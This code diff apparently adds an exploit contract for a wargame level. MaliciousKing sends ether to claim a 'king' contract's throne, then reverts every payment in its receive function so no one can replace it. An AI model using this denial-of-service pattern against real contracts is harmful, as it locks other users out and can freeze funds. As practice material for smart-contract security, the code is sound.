@@ -1,7 +1,23 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
 
+// more gas efficient
 contract MaliciousKing {
+    // Send enough ether to become the king
+    constructor(address kingContract) payable {
+        require(msg.value > 0, "You need to send some Ether to become the king.");
+        (bool success, ) = kingContract.call{value: msg.value}("");
+        require(success, "Transfer failed.");
+    }
+
+    // Make the fallback function revert any incoming transactions
+    receive() external payable {
+        revert("You cannot become the king.");
+    }
+}
+
+// withdraw is useless
+contract MaliciousKingOld {
     address owner;
     address kingContract;
 
